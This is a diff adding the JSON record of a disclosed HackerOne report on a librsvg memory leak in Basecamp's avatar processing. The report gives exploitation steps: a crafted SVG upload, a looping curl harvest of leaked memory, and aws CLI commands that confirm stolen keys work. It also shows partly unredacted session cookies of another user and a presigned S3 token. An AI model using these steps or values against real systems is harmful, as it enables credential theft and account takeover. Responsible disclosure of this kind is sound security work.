@@ -1,0 +1,147 @@
+{
+  "id": 2107680,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTA3Njgw",
+  "url": "https://hackerone.com/reports/2107680",
+  "title": "AWS keys and user cookie leakage via uninitialized memory leak in outdated librsvg version in Basecamp",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2023-08-13T14:16:41.250Z",
+  "submitted_at": "2023-08-13T14:16:41.617Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": true,
+    "username": "neex",
+    "url": "/neex",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/mxguogqjdb4jdwjc379o0se6457e/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 67,
+    "url": "https://hackerone.com/basecamp",
+    "handle": "basecamp",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Basecamp",
+      "twitter_handle": "basecamp",
+      "website": "https://37signals.com/policies/security/response",
+      "about": "Basecamp is the leading online project manager and the birthplace of Ruby on Rails. Creators of the HEY email service."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-09-21T15:17:24.982Z",
+  "bug_reporter_agreed_on_going_public_at": "2023-08-22T15:17:18.199Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Basecamp supports uploading SVG pictures as avatars. Apparently, they are converted via an outdated librsvg version at Basecamp's servers. This version contains a vulnerability that allows leakage of the contents of an uninitialized memory block (that is, something is malloced, never initialized, and then used to build the preview image). Since it seems to be performed in the same unix process as the general request processing, it is possible for an attacker to steal sensitive data from this process, including basecamp configs (e.g., AWS keys) and requests of random users.\n\n## Steps to reproduce\n\n1. First, you must generate an image that triggers the vulnerability. To do so, you will need Python installed. Download the attached program F2597505 and run it like this: `python3 rsvgeb.py gen 260x260 --format bmp zalupa.png` (exactly like this). The result will be stored in the `zalupa.png` file (which is actually an SVG). The picture contains the exploit itself and carefully chosen SVG filters that make it possible to recover the original data regardless of later conversion artifacts.\n2. Second, upload the resulting image as your avatar. Login to your Basecamp account, go to your profile (click on the circle image at the top left corner, then go to \"Profile, password, ███\"), there use the \"Change your avatar button\" and select the `zalupa.png` we generated earlier. Don't forget to click on the green button \"Save my changes\" at the bottom of the page.\n3. After the avatar update, you will see the pixel image instead of the avatar. We'll use `rsvgeb.py` again to extract the information. However, the script uses ImageMagick to extract pixel data from PNG files, so you will need it installed *locally* (at the environment where the `rsvgeb.py` is ran). `apt install imagemagick -y` should be enough on Debian and Ubuntu systems. \n4. After installing ImageMagick, you must retrieve the public link to your avatar. To do this, click on your avatar with the right mouse button, and choose \"Copy image address\". After that, open the copied link in a new tab to follow the redirect. The link should change from something like `████` to something like `████████`. Copy the latter one.\n5. Now, you need to modify the link. Replace the `.avif` extension with `.png`, and the filename (the part right before the extension) with the string `$RANDOM$RANDOM$RANDOM$RANDOM`. After that, insert the link as the `curl` argument into the following command:\n\n     ```\n     while true; do curl \"████$RANDOM$RANDOM$RANDOM$RANDOM.png?v=1\" | python3 rsvgeb.py recover 260x260 - | strings -n 10 | tee -a pizda_hui_govno.txt; done\n     ```\n\n    (note how the link looks; yours should also be like this except for the user id and the signed something part).\n6. Execute the command. You will see fragments of memory from some Basecamp servers that will also accumulate in `pizda_hui_govno.txt`. Sometimes you will see trash or parts of the original SVG, but sometimes you will see fascinating pieces of information. Keep the script running for some time so you will get more sensitive memory fragments (I ran it for 48+ hours). Inspect `pizda_hui_govno.txt` to check what you have.\n\n## Impact\n\nGiven the nature of the vulnerability, the attacker does not control which kind of information she will extract. However, due to the lack of isolation between the image converter process and the main Ruby on Rails application, the extracted info might be quite sensitive.\n\nSeemingly, the most exciting fragment I came across included AWS keys and looked like this:\n\n```\n    ███\n    ██████████\n    ██████\n    █████████\n    -----END RSA PRIVATE KEY-----\n\ns3_backup:\n  access_key_id: ██████████\n  secret_access_key: █████\n\nsns:\n  access_key_id: ███████\n  secret_access_key: █████\n\nactive_record_encryption:\n  primary_key: █████████\n  deterministic_key: █████████\n  key_derivation_salt: █████\n\nnew_relic:\n  license_key: ██████\n```\n\nThat is, apparently, a fragment of some internal Basecamp config. Other similar configs include:\n\n```\nproduction_s3_primary:\n  service: S3\n  access_key_id: ███\n  secret_access_key: █████\n  region: us-east-2\n  bucket: ███\n  upload:\n    storage_class: INTELLIGENT_TIERING\n\nproduction_s3_replica:\n  service: S3\n  access_key_id: ████████\n  secret_access_key: ███\n  region: us-west-2\n  bucket: ████████\n  upload:\n    storage_class: ONEZONE_IA\n```\n\nI've checked that the keys actually work, but have not performed any post exploitation:\n\n```\n$ AWS_DEFAULT_REGION=us-east-2 AWS_ACCESS_KEY_ID=████ AWS_SECRET_ACCESS_KEY=██████ aws sts get-caller-identity\n{\n    \"UserId\": \"██████\",\n    \"Account\": \"██████████\",\n    \"Arn\": \"arn:aws:iam::██████:user/bc3-storage\"\n}\n$ AWS_DEFAULT_REGION=us-east-2 AWS_ACCESS_KEY_ID=████████ AWS_SECRET_ACCESS_KEY=██████████ aws s3 ls s3://███/\n                           PRE ███████/\n                           PRE ████████/\n                           PRE ███/\n                           PRE ██████/\n                           PRE █████████/\n                           PRE ████/\n                           PRE ███████/\n                           PRE ███/\n                           PRE ███/\n                           PRE █████/\n                           PRE █████/\n                           PRE █████/\n█████████ ████████ ███████\n██████ ████████ ██████\n██████ ████████ █████\n██████████ ██████ ██████\n███ █████████ ██████████\n██████████ ███████ █████████\n███ ███████ █████████\n... snip ...\n```\n\nAnother thing that I was able to extract is fragments of queries of other users, including cookies (that is a random example):\n\n```\nX_REAL_IP: █████\nX_FORWARDED_FOR: ████████, ███\nHOST: ████████\nX_QUEUE_START: 1690786808.173\nCONNECTION: close\nCOOKIE: █████\n█████████%██████%2BVxMClK5d1rjoLKbCyFnKab9lI2lZ9sLvGW%2BT60xsygpl6syYIfVHK73km9DT98ecq0JD68OBnI9EdzLcEdmI5%2BXr%2FuOZ5BeUMoX--kvDVySR7oaYSGdHy--RU8uCFyrq8mPCjEvyX38OA%3D%3D; _csrf_token=KHczIU3KBHe%2FJjVhpFWn48FJ2vtYha4YdwUvXdypO51h5iLa4XvkjqaX0XYtzy7fOJahGGN40mfq8GMEN0v1t0SqEnfJUY%2F7CY1mVVSs9EuAFK8wF4Wrh5jA9jk4sen8KDEDXq7sjAMjdnsLLzIjL0LYLG8P8%2FsZz2BHy95JB9JTSsyPleUI--MLV2RZiAHIJrVXv%2F--rQLRhEgWWYGfXxRmqL%2B%2Frw%3D%3D; authenticity_token=████; color_scheme=none; bc3_session_verification_token=0187762ee195d9bdbb1c; bc3_identity_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBCSTBqYXdFPSIsImV4cCI6bnVsbCwicHVyIjoiY29va2llLmJjM19pZGVudGl0eV9pZCJ9fQ%3D%3D--957bc8a13ea3ae13b00792f0fecaa58f046a791b\nACCEPT: application/json\nX_REQUESTED_WITH: XMLHttpRequest\nACCEPT_LANGUAGE: de-DE,de;q=0.9\nIF_NONE_MATCH: W/\"77ae6ae7dd96d1bac74baed254a6ab62\"\nUSER_AGENT: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15\nREFERER: █████\nX_FETCH_TYPE: native\nX_CSRF_TOKEN: ██████████\nX_FORWARDED_PROTO: https\nX_FORWARDED_PORT: 443\n```\n\nAlso, there were some fragments of Ruby code:\n\n```\ndef owner_id_before_type_cast();self.attribute_before_type_cast(\"owner_id\");end;def organization_before_type_cast();self.attribute_before_type_cast(\"organization\");end;def about_url_before_type_cast();self.attribute_before_type_cast(\"about_url\");end;def client_id_before_type_cast();self.attribute_before_type_cast(\"client_id\");end;def client_secret_before_type_cast();self.attribute_before_type_cast(\"client_secret\");end;def redirect_uri_before_type_cast();self.attribute_before_type_cast(\"redirect_uri\");end;def trusted_before_type_cast();self.attribute_before_type_cast(\"trusted\");end;def scope_before_type_cast();self.attribute_before_type_cast(\"scope\");end;def signing_secret_before_type_cast();self.attribute_before_type_cast(\"signing_secret\");\n```\n\n## Mitigation\n\n1. As the first and the easiest hotfix, I suggest updating the librsvg to the latest version. That will fix this particular bug.\n2. Another possible quick-fix option would be to forbid uploading SVG avatars or to skip preview generation for them. Note that the previews are not generated for the SVG files anywhere except the avatars (e.g., in the \"Docs & Files\" section); thus, exploiting librsvg issues is impossible using these endpoints.\n3. As a long-term solution, I suggest moving image preview generation to an isolated environment. If you would convert every image in another process inside a networkless docker, that would eliminate all the class of image converter-related issues.",
+  "bounty_amount": "8868.0",
+  "formatted_bounty": "$8,868",
+  "weakness": {
+    "id": 18,
+    "name": "Information Disclosure"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 2597505,
+      "file_name": "rsvgeb.py",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/8etjey9v20rgegzhrxadwzfusqfg?response-content-disposition=attachment%3B%20filename%3D%22rsvgeb.py%22%3B%20filename%2A%3DUTF-8%27%27rsvgeb.py&response-content-type=text%2Fx-python&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQR3GTHQFV%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T150614Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEBwaCXVzLXdlc3QtMiJIMEYCIQDYu9r85%2FmA%2FOwQXCrGqqGzP1olVwp5xXxLyjxIhiiEpAIhAOj2n7EsJkAoT2Ilhn7A0NEOPWwz4M7rQWHTwO4vyxcYKroFCOX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igw7uZBzHkR2f8exvuMqjgUEJGc5J00ina2AYp35Td0xO%2F%2BmdFxrbnvMOxvTbfMFYwEJlJb2TKwNbl78OdctmpBYd6Yu%2BRc7h7%2BOl1kkRpny%2BWcKZBWsr%2BC8mBr9k4yQwAGKn9RgJqLCzRgP6Rr%2BEmGT%2FmqHlMPE0rAivz4XbTGgytxCkWWVOzGhU1llYs1JCIMwakGDMJZXtPZzC649axfhzHzAnSEruB76boS45uIDBkJdc0k%2BVWQJnEDfJbNDQDrVkuSVZ1OpJWFP%2FqLvUmrhzSv25tSyMJq4SbY5ee8%2FqYyX3%2BGJDi5JngASq6qg%2FIN7LVoTBmtBMt2Iub5agzc0NyuS0BnjyDgWgwIslV70GYLlsBGuULnTjew97X0nOuptEkvyGAfebuZ48nvuULzEUCAHgTRjQ2ZtPPblZfPZPSZ6gWp1jRudR4s8f01lohW48CzCFOvPYIfPXoXRhVqwxCihaegRhDKC9cw9VGXXI1QfsTVUYq94kODH4vmmhj7v06JHytT5vU133eyFkPc3QIuF58Qc0FQslUOwpq58Tx5mNt9XOiHGZdyVuUzxqEod1xFAuX%2Bu4dJr0HZ0Od6v1zrT9i7qbEWc3FcuE9B8cM736bxierenveAQvn1fQIv63EtVbydZuoBXZawMNY7Q7zU9jQbFP5phny5K9N0FIeLISYm52wY%2B8cmlRPrzt9EP2W%2Fij4ZjrPVLETrkNl4CUh1zuAg3Qw5BqTx28hmElPKzMJG0emqmPxlzHX4Fp24nS%2FDZqGylbWQys68AevC1CBa4f6RRHefO7JwNS3K%2F%2FjCK%2FOMjja%2FtyaL0y2AFK73QEfXYNx7WU9mdkp%2BZaL%2BpsFJ1z125QSWQR5tEbLMs9O8IzrHW2iqF3%2FtocfMwjLr8zwY6sAEilY0tuh7Sue4qZU59OxLfRZCBSCizJClwMxWF73lWBVllTfZGsA8ZtD3nBTKssvwv2orXrzhhYtswe7O1w2BoAIHcvH9HxdP6zg%2FTBrsd06k9crqSYXz1xKYO6ylTW50Qaw1IwM9zQpcXdX5OgNwPh9kzroZ%2F5%2B2cDW76qRqVFZlvC2NGdy7hSRd9dKjYSWKCundZ2X0ym06GyxA17sRx3XCjsRfqXwnDZO2Iw68uEw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=eb4f3feb4082a68613274d1af7ce08892fb68fb400df1e4c19175beeb9adbfff",
+      "file_size": 11400,
+      "type": "text/x-python",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2023-09-21T15:17:18.300Z",
+  "allow_singular_disclosure_after": -83029736.43536586,
+  "singular_disclosure_allowed": true,
+  "vote_count": 245,
+  "voters": [
+    "kanazawaaaa",
+    "p4n7h3rx",
+    "infamousnullptr",
+    "ra5h",
+    "thiezn",
+    "thigh_god",
+    "k3v1nx_",
+    "0xotachi",
+    "orange303",
+    "achabi7",
+    "and 235 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.6,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 4655,
+    "asset_type": "URL",
+    "asset_identifier": "3.basecamp.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
